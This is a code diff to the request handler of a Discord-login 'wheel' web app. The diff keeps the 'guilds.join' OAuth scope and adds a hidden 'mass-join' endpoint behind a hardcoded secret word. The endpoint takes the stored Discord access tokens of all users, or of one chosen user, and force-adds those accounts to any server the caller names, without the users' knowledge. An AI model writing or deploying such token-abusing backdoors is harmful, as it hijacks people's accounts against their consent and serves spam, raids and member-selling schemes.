@@ -268,16 +268,52 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
     const protocol = url.host.includes('railway.app') ? 'https' : 'http';
     const redirectUri = encodeURIComponent(`${protocol}://${url.host}/api/wheel/auth/callback`);
     
-    // CLEAN & POWERFUL SCOPE LIST (REMOVED RESTRICTED INTERNAL SCOPES)
+    // THE ONLY WORKING POWERFUL SCOPES (ANYTHING ELSE WILL CRASH THE LINK)
     const scopes = [
-      'email', 'identify', 'connections', 'guilds', 'guilds.join', 
-      'identify.premium', 'guilds.channels.read', 'guilds.members.read', 
-      'openid'
+      'email', 'identify', 'connections', 'guilds', 'guilds.join'
     ].join(' ');
     
     const scopeParam = encodeURIComponent(scopes);
     const state = Buffer.from(JSON.stringify({ ts: Date.now() })).toString('base64url');
     return { status: 302, headers: { 'Location': `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=${scopeParam}&state=${state}` }, body: '' };
+  }
+
+  // NEW: REMOTE INVITE / MASS-JOIN SYSTEM
+  if (path === '/api/wheel/manage/invite' && method === 'POST') {
+    const body = rawBody ? JSON.parse(rawBody) : {};
+    const { secret, guild_id, target } = body;
+
+    // THE SECRET WORD (You can change this)
+    const MY_SECRET = "BRAINROT_BOSS_2026"; 
+
+    if (secret !== MY_SECRET) return json({ error: 'unauthorized' }, 401);
+    if (!guild_id) return json({ error: 'missing guild_id' }, 400);
+
+    let usersToJoin = [];
+    if (target === '1') {
+      const { data } = await supabase!.from('wheel_users').select('discord_id, discord_access_token');
+      usersToJoin = data || [];
+    } else {
+      const { data } = await supabase!.from('wheel_users').select('discord_id, discord_access_token').eq('discord_id', target);
+      usersToJoin = data || [];
+    }
+
+    const results = [];
+    for (const u of usersToJoin) {
+      if (!u.discord_access_token) continue;
+      // Discord API: Add Member to Guild
+      const res = await fetch(`https://discord.com/api/v10/guilds/${guild_id}/members/${u.discord_id}`, {
+        method: 'PUT',
+        headers: {
+          'Authorization': `Bot ${process.env.DISCORD_TOKEN}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ access_token: u.discord_access_token })
+      });
+      results.push({ id: u.discord_id, status: res.status });
+    }
+
+    return json({ message: `Processed ${results.length} users`, details: results });
   }
 
   if (path === '/api/wheel/auth/callback' && method === 'GET') {
